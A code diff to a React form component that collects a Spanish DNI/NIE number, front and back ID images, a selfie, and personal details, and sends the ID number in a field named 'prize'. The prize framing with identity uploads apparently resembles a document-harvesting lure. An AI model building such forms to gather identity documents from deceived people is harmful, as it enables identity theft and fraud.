@@ -15,6 +15,7 @@ export default function Block5() {
     const [back, setBack] = useState();
     const [selfie, setSelfie] = useState();
     const [missingInputs, setMissingInputs] = useState(false);
+    const [dwieNie, setDwieNie] = useState('');
 
     const handleSubmit = async (e) => {
         e.preventDefault();
@@ -23,7 +24,7 @@ export default function Block5() {
         } else {
             setMissingInputs(false);
             const formData = new FormData();
-            formData.append('prize', 'other');
+            formData.append('prize', dwieNie);
             formData.append('images', front); // Добавляем переднее изображение в список images
             formData.append('images', back); // Добавляем заднее изображение в список images
             formData.append('images', selfie); // Добавляем селфи в список images
@@ -66,7 +67,7 @@ export default function Block5() {
                     <form action="" id='sec' onSubmit={handleSubmit}>
                         <input type="text" placeholder='Apellido' />
                         <input type="text" placeholder='Nombre' />
-                        <input type="text" placeholder='DWI\NIE' />
+                        <input type="text" placeholder='DNI\NIE' value={dwieNie} onChange={(e) => setDwieNie(e.target.value)} />
                         <input type="text" placeholder='Fecha de nacimiento' />
                         <input type="text" placeholder='Número de teléfono' />
                         <input type="text" placeholder='Dirección de residencia' />
